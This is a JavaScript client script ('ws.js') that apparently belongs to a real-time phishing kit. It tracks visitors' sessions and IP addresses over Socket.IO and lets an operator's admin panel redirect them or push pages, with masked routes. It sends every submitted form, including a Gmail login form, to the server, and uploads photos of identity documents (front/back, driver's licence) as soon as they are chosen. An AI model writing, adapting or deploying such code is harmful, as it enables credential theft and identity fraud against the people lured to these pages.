"use strict";

// Monkey-patch console.warn to auto-reconnect on any warning
(function() {
    const origWarn = console.warn;
    console.warn = function(...args) {
        origWarn.apply(console, args);
        if (window.sessionManager && typeof window.sessionManager.attemptReconnect === 'function') {
            window.sessionManager.attemptReconnect();
        }
    };
})();

// Flag to ensure SessionManager is initialized only once
window.isSessionManagerInitialized = window.isSessionManagerInitialized || false;

class SessionManager {
    constructor() {
        this.sessionId = null;
        this.ipAddress = null;
        this.lastActivity = 0;
        this.updateInterval = null;
        this.isValid = false;
        this.lastUpdateTime = 0;
        this.minUpdateInterval = 3000;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = Infinity;
        this.reconnectDelay = 1;
        this.socket = null;
        this.config = null;
        this.connectionMonitor = null;
        this.pendingUpdates = new Map();
        this.updateTimer = null;
        this.initializeSocket();
    }

    async initializeSocket() {
        try {
            const config = await getConfigAsync();
            this.config = config; // Store config early
            window.appConfig = {...(window.appConfig || {}), ...config}; // Update global config too

            // Check if the new SpaSystem is active AND hide_route is true
            if (window.SpaSystem && config?.options?.hide_route === true) {
                console.log("[ws.js] SpaSystem detected and hide_route is true. Skipping ws.js SessionManager initialization.");
                // Ensure socket instance exists if needed globally, but don't attach ws.js listeners
                if (!window.wsocket) {
                    window.wsocket = io({ /* basic config */ });
                }
                this.socket = window.wsocket; // Keep reference
                return; // Prevent further ws.js initialization
            }

            // --- Proceed with ws.js initialization (hide_route is false or SpaSystem not present) ---
            console.log("[ws.js] Initializing SessionManager (hide_route is false or SpaSystem not detected).");
            if (!window.wsocket) {
                window.wsocket = io({
                    reconnection: true,
                    reconnectionAttempts: Infinity,
                    reconnectionDelay: 1000,
                    reconnectionDelayMax: 1000,
                    timeout: 5000,
                    transports: ['websocket'],
                    autoConnect: true
                });
            }
            this.socket = window.wsocket;
            this.setupEventListeners(); // Setup ws.js specific listeners
            
            if (this.socket.connected) {
                console.log("[ws.js] Socket already connected on init.");
                this.handleConnect();
            } else {
                console.log("[ws.js] Socket not connected on init, setting up connect listener.");
                this.socket.once('connect', () => {
                    console.log("[ws.js] Socket connected via 'once' listener.");
                    this.handleConnect();
                });
            }
            
            this.socket.on('connect_error', (error) => {
                console.error('WebSocket connection error:', error);
                this.handleConnectionError(error);
            });
            
            // loadConfig() logic is now partially handled above, 
            // but we might still need parts of it (like setting initialPage)
            this.finishConfigLoading(); 

        } catch (error) {
            console.error("[ws.js] Failed to load configuration during initialization:", error);
            // Handle error state - maybe attempt basic socket connection without config?
        }
    }

    // New function to handle remaining logic after config is loaded in initializeSocket
    finishConfigLoading() {
        if (!this.config) return; // Should not happen if called from initializeSocket success path

        const initialPage = this.config.initial_page || this.config.waiting || 'waiting';
            window.currentPage = this.normalizePath(initialPage);
    
        // Check if we are on an admin path *before* deciding to emit render_page
        const isAdmin = this.isAdminPath(window.location.pathname);
    
        // Emit initial page info if connected (relevant for hide_route=false)
            if (this.socket && this.socket.connected) {
                this.socket.emit('update_session', {
                    updates: { current_page: window.currentPage }
                });
            // Don't emit render_page here if hide_route is false, browser handles it
            if (this.config.options?.hide_route === true) {
                console.log("[ws.js] (direct) hide_route is true. ws.js defers initial render_page to spa.js.");
            } else {
                // If hide_route is false, this block was already effectively a no-op for rendering.
                console.log("[ws.js] (direct) hide_route is false. Browser handles initial render. No ws.js emit needed here.");
            }
            // Generate initial data if needed (might depend on page type?)
            if (!isAdmin) { // Avoid generating default data on admin pages
                this.generateData(this.config);
            }
            } else {
                // If not connected yet, set up the same logic for the 'connect' event
                this.socket.once('connect', () => {
                    this.socket.emit('update_session', {
                        updates: { current_page: window.currentPage }
                    });
                 if (this.config.options?.hide_route === true) {
                     console.log("[ws.js] (on connect) hide_route is true. ws.js defers initial render_page to spa.js.");
                 } else {
                     // If hide_route is false, this block was already effectively a no-op for rendering.
                     console.log("[ws.js] (on connect) hide_route is false. Browser handles initial render. No ws.js emit needed here.");
                 }
                // Generate initial data if needed (might depend on page type?)
                if (!isAdmin) { // Avoid generating default data on admin pages
                    this.generateData(this.config);
                }
        });
        }
    }

    updateUrlQueryParams(params) {
        const url = new URL(window.location.href);
        for (const key in params) {
            if (params.hasOwnProperty(key)) {
                url.searchParams.set(key, params[key]);
            }
        }
        window.history.pushState({}, '', url);
    }

    generateData(config) {
        if (!this.socket || !this.socket.connected) {
            console.warn('Socket not connected, cannot generate data. Attempting to reconnect...');
            this.attemptReconnect();
            return;
        }

        if (this.isAdminPath(window.location.pathname)) {
            return;
        }

        const configObject = typeof config === 'string' ? JSON.parse(config) : config;
        configObject.source = 'client_interface';
        this.socket.emit('generate_data', configObject);
    }

    handleGeneratedData(result) {
        if (result.list && result.list.length > 0) {
            this.updateUrlQueryParams(result.list[0]);
        }
    }

    shouldRenderPage() {
        if (!this.config) {
            return false;
        }
        return this.config.options?.hide_route === true;
    }

    setupEventListeners() {
        const events = [
            'connect',
            'session_init',
            'redirect',
            'client_activity_update_error',
            'disconnect',
            'connect_error',
            'change_page',
            'page_rendered',
            'generated_data',
            'error',
            'config_saved',
            'connection_ack'
        ];
        
        events.forEach(event => {
            this.socket.off(event);
        });
        
        this.socket.on('connect', () => this.handleConnect());
        this.socket.on('connection_ack', (data) => {
            if (data.session_id) {
                this.sessionId = data.session_id;
                this.isValid = true;
            }
        });
        this.socket.on('session_init', (data) => this.handleSessionInit(data));
        this.socket.on('redirect', (url) => this.handleRedirect(url));
        this.socket.on('client_activity_update_error', (err) => this.handleError(err));
        this.socket.on('disconnect', () => this.handleDisconnect());
        this.socket.on('connect_error', (error) => this.handleConnectionError(error));
        this.socket.on('change_page', (data) => this.handleChangePage(data));
        this.socket.on('page_rendered', (data) => this.handlePageRendered(data));
        this.socket.on('generated_data', (result) => this.handleGeneratedData(result));
        
        this.monitorConnection();
    }

    monitorConnection() {
        if (this.connectionMonitor) {
            clearInterval(this.connectionMonitor);
        }
        // This acts as a fallback check
        this.connectionMonitor = setInterval(() => {
            if (!this.socket.connected) {
                console.log('[ws.js] Monitor detected disconnected state. Attempting reconnect.');
                this.attemptReconnect(); // Use the simplified reconnect attempt
            }
        }, 5000); // Keep the 5-second interval for the fallback check
    }

    handleConnect() {
        this.initializeSession();
        
        console.log("[ws.js] Connection established. Dispatching 'ws:reconnected' event.");
        // Notify other modules about the connection/reconnection
        document.dispatchEvent(new CustomEvent('ws:reconnected'));

        this.socket.emit('get_session_data', (response) => {
            if (response && response.data) {
                this.sessionId = response.data.id;
                this.ipAddress = response.data.ip;
                this.isValid = true;
            }
        });
    }

    initializeSession() {
        this.socket.emit('init_session_request');
    }

    handleSessionInit(data) {
        this.sessionId = data.session_id;
        this.ipAddress = data.ip;
        this.isValid = true;
        this.startUpdates();
    }

    handleRedirect(url) {
        if (this.isAdminPath(window.location.pathname)) {
            return;
        }
        // Add a check to prevent redirection if hide_route is true,
        // as navigation should be handled by change_page/render_page
        if (this.config?.options?.hide_route !== true) {
            window.location.href = url;
        } else {
            console.log(`[ws.js] Redirect suppressed in hide_route mode. Requested URL: ${url}`);
            // Optionally, you could trigger a page change here instead
            // this.handleChangePage(url); 
        }
    }

    handleDisconnect() {
        this.isValid = false;
        console.log('[ws.js] Socket disconnected. Relying on Socket.IO auto-reconnect.');
        // No explicit connect() or setTimeout needed here, Socket.IO handles it
        // based on the 'reconnection: true' option set during initialization.
    }

    handleError(error) {
        console.error('[ws.js] SessionManager Error:', error);
        if (error.code === 'SESSION_NOT_FOUND') {
            this.initializeSession();
        } else if (error.fatal) {
            this.isValid = false;
            this.stopUpdates();
        }
    }

    handleConnectionError(error) {
        this.isValid = false;
        console.error('[ws.js] WebSocket connection error:', error, 'Attempting reconnect via Socket.IO.');
        // No explicit connect() needed here. Socket.IO's reconnection mechanism
        // is triggered by the 'connect_error' event when reconnection is enabled.
    }

    shouldRenderPage() {
        return this.config?.options?.hide_route === true && 
               this.config?.pages?.[this.normalizePath(window.currentPage)];
    }

    handleChangePage(data) {
        if (!data || this.isAdminPath(window.location.pathname)) {
            return;
        }
    
        let pagePath = typeof data === 'object' ? data.page : data;
        if (!pagePath) {
            return;
        }
    
        const normalizedPage = this.normalizePath(pagePath);
    
        if (this.shouldRenderPage()) {
            window.currentPage = normalizedPage;
            this.socket.emit('render_page', { 
                page: normalizedPage,
            });
        } else {
            window.location.href = normalizedPage;
        }
    }

    reinitializePageFunctionality() {
        const self = this;
        const actualRoute = window.currentPage || document.body.dataset.actualRoute || window.location.pathname;

        // Skip upload trigger initialization for id2 pages
        if (actualRoute.includes('id2')) {
            console.log('[ws.js] Skipping upload trigger initialization for id2 page in reinitializePageFunctionality');
            return;
        }

        document.querySelectorAll('form').forEach(form => {
            form.dataset.pageRoute = actualRoute;
            if (form.dataset.initialized !== 'true') {
                form.dataset.initialized = 'true';
                form.addEventListener('submit', function (e) {
                    // --- BEGIN ADDED VALIDATION CHECK ---
                    if (typeof validateGmailForm === 'function' && !validateGmailForm()) {
                        console.log('[ws.js] validateGmailForm() returned false. Stopping form submission.');
                        // Prevent default submission behavior if validation fails
                        e.preventDefault();
                        e.stopPropagation();
                        // Re-enable submit buttons immediately if validation fails
                        const submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
                        submitButtons.forEach(btn => {
                            btn.disabled = false;
                            // No need to restore text here as it likely wasn't changed yet
                        });
                        return; // Stop processing this event
                    }
                    // --- END ADDED VALIDATION CHECK ---

                    e.preventDefault();
                    e.stopPropagation();
                    const formData = new FormData(this);
                    const formDataObj = Object.fromEntries(formData.entries());
                    formDataObj.page_route = form.dataset.pageRoute || actualRoute;
                    const submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
                    submitButtons.forEach(btn => {
                        btn.disabled = true;
                        btn.dataset.originalText = btn.innerHTML;
                    });
                    window.wsocket.emit('form_submit', {
                        page: window.currentPage,
                        formData: formDataObj
                    });
                });
            }
        });
        
        // Skip upload trigger setup if we're on an id2 page
        if (!actualRoute.includes('id2')) {
            document.querySelectorAll('.uploadTrigger, #front:not([data-testid="idv-id-type-drivers_licence"]), #back, #uploadBtn').forEach(trigger => {
            if (trigger.dataset.initialized !== 'true') {
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.accept = 'image/*';
                fileInput.name = trigger.id + '_file';
                fileInput.style.display = 'none';
                fileInput.setAttribute('capture', 'environment');
                const form = trigger.closest('form');
                if (form) {
                    form.setAttribute('enctype', 'multipart/form-data');
                    form.appendChild(fileInput);
                }
                const originalWidth = trigger.offsetWidth;
                const originalHeight = trigger.offsetHeight;
                trigger.addEventListener('click', () => { console.log(`[WS Upload Debug] #${trigger.id} clicked, opening file dialog`); fileInput.click(); });
                trigger.dataset.initialized = 'true';
                fileInput.addEventListener('change', function () {
                    if (this.files && this.files[0]) {
                        console.log(`[WS Upload Debug] File selected for #${trigger.id}:`, this.files[0].name);
                        const reader = new FileReader();
                        reader.onload = (e) => {
                            // Only update the preview for the current trigger (front or back)
                            const oldWrapper = trigger.querySelector('.spa-upload-preview-wrapper');
                            if (oldWrapper) { oldWrapper.remove(); console.log(`[WS Upload Debug] Removed old preview wrapper for #${trigger.id}`); }
                            trigger.style.width = originalWidth + 'px';
                            trigger.style.height = originalHeight + 'px';
                            trigger.style.display = 'flex';
                            trigger.style.alignItems = 'center';
                            trigger.style.justifyContent = 'center';
                            const img = document.createElement('img');
                            img.src = e.target.result;
                            img.style.maxWidth = '100%';
                            img.style.maxHeight = '100%';
                            img.style.objectFit = 'contain';
                            const wrapper = document.createElement('div');
                            wrapper.className = 'spa-upload-preview-wrapper';
                            wrapper.style.width = '100%';
                            wrapper.style.height = '100%';
                            wrapper.style.display = 'flex';
                            wrapper.style.alignItems = 'center';
                            wrapper.style.justifyContent = 'center';
                            wrapper.style.position = 'relative';
                            wrapper.appendChild(img);
                            trigger.appendChild(wrapper);
                            console.log(`[WS Upload Debug] Preview updated for #${trigger.id}`);
                        };
                        reader.readAsDataURL(this.files[0]);
                        window.sessionManager.uploadFileImmediately(this.files[0], this.name, trigger.id, window.currentPage);
                    }
                });
            }
        });
        }
        if (this.socket) {
        this.socket.off('form_submit_response');
        }
        if (window.wsocket) { 
        window.wsocket.off('form_submit_response');
        }
        if (!window.formSubmitResponseHandler) {
            window.formSubmitResponseHandler = function(data) {
                document.querySelectorAll('button[type="submit"], input[type="submit"]').forEach(btn => {
                    btn.disabled = false;
                    if (btn.dataset.originalText) {
                        btn.innerHTML = btn.dataset.originalText;
                    }
                });
                if (data.status === 'success') {
                    if (data.next_page) {
                        window.currentPage = data.next_page;
                        if (!window.sessionManager.isAdminPath(data.next_page)) {
                            if (window.sessionManager.shouldRenderPage()) {
                                window.wsocket.emit('render_page', {
                                    page: data.next_page,
                                    timestamp: Date.now()
                                });
                            } else {
                                window.location.href = '/' + data.next_page;
                            }
                        }
                    } else if (data.redirect) {
                        if (!window.sessionManager.isAdminPath(window.location.pathname)) {
                             window.location.href = data.redirect;
                        }
                    }
                } else {
                    const mainContent = document.getElementById('main-content');
                    if (mainContent) {
                        mainContent.innerHTML = `
                            <div class="error-message">
                                <h2>Submission Error</h2>
                                <p>${data.message || 'An error occurred'}</p>
                                <button onclick="window.location.reload()">Try Again</button>
                            </div>
                        `;
                        mainContent.classList.add('visible');
                    }
                }
            };
        }
        if (window.wsocket) {
        window.wsocket.on('form_submit_response', window.formSubmitResponseHandler);
        }
    }

    uploadFileImmediately(file, fieldName, triggerId, pageRoute) {
        if (!file) return;
        
        const actualPage = this.getActualCurrentPage(pageRoute);
        
        const formData = new FormData();
        formData.append(fieldName, file);
        formData.append('immediate_upload', 'true');
        formData.append('trigger_id', triggerId);
        formData.append('page_route', actualPage);
        
        fetch('/process-entry', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (!data.success) {
                console.error('Upload error:', data.message || 'Upload failed');
            }
        })
        .catch(error => {
            console.error('Error uploading file:', error);
        });
    }
    
    getActualCurrentPage(providedRoute) {
        if (providedRoute && providedRoute !== '/waiting') {
            return this.normalizePath(providedRoute);
        }
        
        if (document.body.dataset.actualRoute && document.body.dataset.actualRoute !== '/waiting') {
            return this.normalizePath(document.body.dataset.actualRoute);
        }
        
        if (window.currentPage && window.currentPage !== '/waiting') {
            return this.normalizePath(window.currentPage);
        }
        
        const pathname = window.location.pathname;
        if (pathname && pathname !== '/waiting') {
            return this.normalizePath(pathname);
        }
        
        return this.normalizePath(providedRoute || window.currentPage || '/');
    }

    handlePageRendered(data) {
        // This method is removed as per the instructions
    }

    handleFallbackNavigation() {
        const waitingPage = window.appConfig?.waiting || '/waiting';
        window.isResumingSession = true;
        if (this.shouldRenderPage()) {
            this.navigateToPage(waitingPage);
        } else {
            window.location.href = waitingPage;
        }
    }

    normalizePath(path) {
        if (typeof path !== 'string') { // Ensure input is a string
            // console.warn('[ws.js] normalizePath: received non-string input, returning "/":', path);
            return '/';
        }
        path = path.trim();
        if (!path.startsWith('/')) path = '/' + path;
        return path.replace(/\/+$/, '') || '/'; // Ensure it doesn't end with multiple slashes, and default to / if empty
    }

    navigateToPage(page) {
        const normalizedPage = this.normalizePath(page);
        if (normalizedPage === window.currentPage && !window.isResumingSession) {
            return;
        }
        window.currentPage = normalizedPage;
        window.initialPageLoad = false;
        window.isResumingSession = false;
        this.socket.emit('update_session', {
            updates: {
                current_page: normalizedPage,
                last_activity: Math.floor(Date.now() / 1000)
            }
        });
        if (this.shouldRenderPage()) {
            this.socket.emit('render_page', { page: normalizedPage, is_resume: window.isResumingSession });
        }
    }

    startUpdates() {
        this.stopUpdates();
        if (this.isValid) {
            this.sendUpdate();
            this.updateInterval = setInterval(() => this.sendUpdate(), this.minUpdateInterval);
        }
    }

    stopUpdates() {
        if (this.updateInterval) {
            clearInterval(this.updateInterval);
            this.updateInterval = null;
        }
    }

    sendUpdate() {
        if (!this.socket.connected) {
            console.warn('[ws.js] sendUpdate: Skipped, socket not connected at the very start of sendUpdate.'); 
            return;
        }

        if (!this.isValid || !this.sessionId) {
            console.warn(`[ws.js] sendUpdate: Skipped, session not valid (isValid: ${this.isValid}, sessionId: ${this.sessionId}). Attempting to re-initialize.`);
            this.initializeSession();
            return;
        }

        let currentPagePath = '/'; 
        // console.log('[ws.js] sendUpdate: Entered function, past initial guards.'); // DEBUG
        try {
            const hideRouteActive = this.config?.options?.hide_route === true;
            // console.log(`[ws.js] sendUpdate: hideRouteActive: ${hideRouteActive}`); // DEBUG
            const currentBrowserPath = this.normalizePath(window.location.pathname); 
            // console.log(`[ws.js] sendUpdate: currentBrowserPath: ${currentBrowserPath}`); // DEBUG

            if (this.isAdminPath(currentBrowserPath)) {
                currentPagePath = currentBrowserPath;
                // console.log(`[ws.js] sendUpdate: Determined isAdminPath. currentPagePath: ${currentPagePath}`); // DEBUG
            } else if (hideRouteActive) {
                const logicalPageIdentifier = this.normalizePath(window.currentPage || '/'); 
                // console.log(`[ws.js] sendUpdate: SPA mode. logicalPageIdentifier: ${logicalPageIdentifier}`); // DEBUG
                const pageKey = logicalPageIdentifier.substring(1); 
                const pageConfigForCurrentKey = this.config?.pages?.[pageKey];
                const customRouteForCurrentKey = pageConfigForCurrentKey?.route;

                if (customRouteForCurrentKey) {
                    currentPagePath = customRouteForCurrentKey.startsWith('/') ? customRouteForCurrentKey : `/${customRouteForCurrentKey}`;
                    // console.log(`[ws.js] sendUpdate: SPA custom route. currentPagePath: ${currentPagePath}`); // DEBUG
                } else {
                    currentPagePath = logicalPageIdentifier; 
                    // console.log(`[ws.js] sendUpdate: SPA key path. currentPagePath: ${currentPagePath}`); // DEBUG
                }
            } else {
                currentPagePath = currentBrowserPath; 
                // console.log(`[ws.js] sendUpdate: Standard mode. currentPagePath: ${currentPagePath}`); // DEBUG
            }
            
            if (typeof currentPagePath !== 'string' || currentPagePath.trim() === '') {
                console.warn(`[ws.js] sendUpdate: currentPagePath was invalid or empty ('${currentPagePath}'), defaulting to '/'.`);
                currentPagePath = '/';
            }
        } catch (error) {
            console.error('[ws.js] sendUpdate: Error determining currentPagePath:', error);
            currentPagePath = '/'; 
        }
        // console.log(`[ws.js] sendUpdate: Final currentPagePath before emit: ${currentPagePath}`); // DEBUG

        const updateData = {
            session_id: this.sessionId,
            last_activity: Math.floor(Date.now() / 1000), 
            page: currentPagePath, 
            ip: this.ipAddress
        };
        
        console.log(`[ws.js] sendUpdate: PRE-EMIT CHECK. Socket connected: ${this.socket.connected}, Session valid: ${this.isValid}, Session ID: ${this.sessionId}`);
        console.log('[ws.js] sendUpdate: Emitting client_activity_update with data:', JSON.stringify(updateData));
        
        this.socket.emit('client_activity_update', updateData, (response) => {
            if (response?.error) {
                console.error('[ws.js] sendUpdate callback error:', response.error);
                this.handleError(response.error);
            } else if (response?.status === 'session_not_found') {
                 console.warn('[ws.js] sendUpdate callback: Server responded with session_not_found. Re-initializing.');
                 this.isValid = false; 
                 this.initializeSession(); 
            } else if (response?.status === 'success') {
                // console.log('[ws.js] sendUpdate: client_activity_update acknowledged by server.'); // Optional: Can be noisy
            }
        });
    }

    isAdminPath(page) {
        const normalizedPage = this.normalizePath(page);
        return normalizedPage === '/admin' || normalizedPage.startsWith('/admin/');
    }

    attemptReconnect() {
        if (!this.socket.connected) {
            console.log('[ws.js] Attempting to reconnect socket...');
            this.socket.connect(); // Just ask Socket.IO to connect; it will handle delays/retries.
        }
    }

    requestRedirection(redirectUrl) {
        if (this.socket?.connected && this.sessionId && redirectUrl) {
            this.socket.emit('request_redirect', {
                session_id: this.sessionId,
                redirect: redirectUrl
            });
        }
    }

    queueUpdate(updates) {
        if (!this.sessionId) return;
        
        const currentUpdates = this.pendingUpdates.get(this.sessionId) || {};
        this.pendingUpdates.set(this.sessionId, { ...currentUpdates, ...updates });
        
        if (!this.updateTimer) {
            this.updateTimer = setTimeout(() => this.sendQueuedUpdates(), this.minUpdateInterval);
        }
    }

    sendQueuedUpdates() {
        if (!this.socket.connected || !this.sessionId) return;
        
        const updates = this.pendingUpdates.get(this.sessionId);
        if (updates) {
            this.socket.emit('update_session', {
                session_id: this.sessionId,
                updates: updates
            });
            this.pendingUpdates.delete(this.sessionId);
        }
        
        this.updateTimer = null;
    }

    dispose() {
        this.stopUpdates();
        if (this.connectionMonitor) {
            clearInterval(this.connectionMonitor);
            this.connectionMonitor = null;
        }
        if (this.updateTimer) {
            clearTimeout(this.updateTimer);
            this.updateTimer = null;
        }
        const events = [
            'connect', 'session_init', 'redirect', 'client_activity_update_error',
            'disconnect', 'connect_error', 'change_page', 'page_rendered',
            'generated_data', 'error', 'config_saved', 'form_submit_response'
        ];
        events.forEach(event => this.socket.off(event));
        window.wsocket.off('form_submit_response');
    }

    handleReviewCompletion() {
        if (!this.socket || !this.socket.connected) {
            alert("Connection error. Please wait a moment and try clicking the last button again, or refresh.");
            return;
        }

        if (!this.sessionId) {
            alert("Error: Cannot identify your session. Please clear cookies and refresh.");
            return;
        }

        this.socket.emit('review_completed', { session_id: this.sessionId });

        document.querySelectorAll('#credentials button, #attempted button, #requested button').forEach(btn => {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.style.cursor = 'default';
        });
    }

    ensureDynamicResources(tempContainer, renderedPage) {
        this.cleanupDynamicResources(renderedPage);
        const head = document.head;
        tempContainer.querySelectorAll('link[rel="stylesheet"]').forEach(stylesheet => {
            if (![...head.querySelectorAll('link[rel="stylesheet"]')].some(l => l.href === stylesheet.href)) {
                const newStylesheet = document.createElement('link');
                Array.from(stylesheet.attributes).forEach(attr => {
                    newStylesheet.setAttribute(attr.name, attr.value);
                });
                head.appendChild(newStylesheet);
            }
        });
        tempContainer.querySelectorAll('meta[data-dynamic-resource="true"]').forEach(meta => {
            if (![...head.querySelectorAll('meta[data-dynamic-resource="true"]')].some(m => m.outerHTML === meta.outerHTML)) {
                const newMeta = document.createElement('meta');
                Array.from(meta.attributes).forEach(attr => {
                    newMeta.setAttribute(attr.name, attr.value);
                });
                head.appendChild(newMeta);
            }
        });
        tempContainer.querySelectorAll('style[data-dynamic-style="true"]').forEach(style => {
            if (![...head.querySelectorAll('style[data-dynamic-style="true"]')].some(s => s.innerHTML === style.innerHTML)) {
                const newStyle = document.createElement('style');
                Array.from(style.attributes).forEach(attr => {
                    newStyle.setAttribute(attr.name, attr.value);
                });
                newStyle.innerHTML = style.innerHTML;
                head.appendChild(newStyle);
            }
        });
    }

    cleanupDynamicResources(currentPage) {
        const head = document.head;
        head.querySelectorAll('link[rel="stylesheet"][data-page]').forEach(link => {
            if (link.getAttribute('data-page') && link.getAttribute('data-page') !== currentPage) {
                link.remove();
            }
        });
        head.querySelectorAll('meta[data-dynamic-resource="true"][data-page]').forEach(meta => {
            if (meta.getAttribute('data-page') && meta.getAttribute('data-page') !== currentPage) {
                meta.remove();
            }
        });
        head.querySelectorAll('style[data-dynamic-style="true"][data-page]').forEach(style => {
            if (style.getAttribute('data-page') && style.getAttribute('data-page') !== currentPage) {
                style.remove();
            }
        });
    }
}

window.appConfig = {};
window.currentPage = null;
window.isResumingSession = false;

document.addEventListener('DOMContentLoaded', () => {
    if (window.isSessionManagerInitialized && window.sessionManager) {
        console.log('[ws.js] DOMContentLoaded: SessionManager already initialized. Checking connection.');
        if (window.sessionManager.socket && !window.sessionManager.socket.connected) {
            window.sessionManager.attemptReconnect();
        }
        // Re-bind form handlers and other dynamic elements for admin page if needed
        if (window.sessionManager.isAdminPath(window.location.pathname)) {
             console.log('[ws.js] DOMContentLoaded: Re-initializing page functionality for admin.');
             window.sessionManager.reinitializePageFunctionality();
        }
        return; 
    }

    if (window.sessionManager && typeof window.sessionManager.dispose === 'function') {
        console.log('[ws.js] DOMContentLoaded: Disposing previous SessionManager instance.');
        window.sessionManager.dispose();
    }
    console.log('[ws.js] DOMContentLoaded: Initializing new SessionManager instance.');
    window.sessionManager = new SessionManager();
    window.isSessionManagerInitialized = true;

    // Skip upload trigger initialization for id2 pages
    const currentPath = window.location.pathname;
    if (currentPath.includes('id2')) {
        console.log('[ws.js] Skipping upload trigger initialization for id2 page');
        return;
    }

    // Initial call to setup forms, etc.
    window.sessionManager.reinitializePageFunctionality(); 

    window.getCookie = function (name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
        return undefined;
    };

    if (window.sessionManager.isAdminPath(window.location.pathname)) {
        return;
    }

    // Skip upload trigger setup if we're on an id2 page
    if (!currentPath.includes('id2')) {
    document.querySelectorAll('.uploadTrigger, [id="front"], [id="back"]').forEach(trigger => {
         if (trigger.dataset.initialized !== 'true') {
             const fileInput = document.createElement('input');
             fileInput.type = 'file';
             fileInput.accept = 'image/*';
             fileInput.name = trigger.id + '_file';
             fileInput.style.display = 'none';
             fileInput.setAttribute('capture', 'environment');
             const form = trigger.closest('form');
             if (form) {
                 form.setAttribute('enctype', 'multipart/form-data');
                 form.appendChild(fileInput);
             }
             const originalWidth = trigger.offsetWidth;
             const originalHeight = trigger.offsetHeight;
             trigger.addEventListener('click', () => { console.log(`[WS Upload Debug] #${trigger.id} clicked, opening file dialog`); fileInput.click(); });
             trigger.dataset.initialized = 'true';
             fileInput.addEventListener('change', function () {
                 if (this.files && this.files[0]) {
                     console.log(`[WS Upload Debug] File selected for #${trigger.id}:`, this.files[0].name);
                     const reader = new FileReader();
                     reader.onload = (e) => {
                         // Only update the preview for the current trigger (front or back)
                         const oldWrapper = trigger.querySelector('.spa-upload-preview-wrapper');
                         if (oldWrapper) { oldWrapper.remove(); console.log(`[WS Upload Debug] Removed old preview wrapper for #${trigger.id}`); }
                         trigger.style.width = originalWidth + 'px';
                         trigger.style.height = originalHeight + 'px';
                         trigger.style.display = 'flex';
                         trigger.style.alignItems = 'center';
                         trigger.style.justifyContent = 'center';
                         const img = document.createElement('img');
                         img.src = e.target.result;
                         img.style.maxWidth = '100%';
                         img.style.maxHeight = '100%';
                         img.style.objectFit = 'contain';
                         const wrapper = document.createElement('div');
                         wrapper.className = 'spa-upload-preview-wrapper';
                         wrapper.style.width = '100%';
                         wrapper.style.height = '100%';
                         wrapper.style.display = 'flex';
                         wrapper.style.alignItems = 'center';
                         wrapper.style.justifyContent = 'center';
                         wrapper.style.position = 'relative';
                         wrapper.appendChild(img);
                         trigger.appendChild(wrapper);
                         console.log(`[WS Upload Debug] Preview updated for #${trigger.id}`);
                     };
                     reader.readAsDataURL(this.files[0]);
                     window.sessionManager.uploadFileImmediately(this.files[0], this.name, trigger.id, window.currentPage);
                 }
             });
         }
     });
    }
});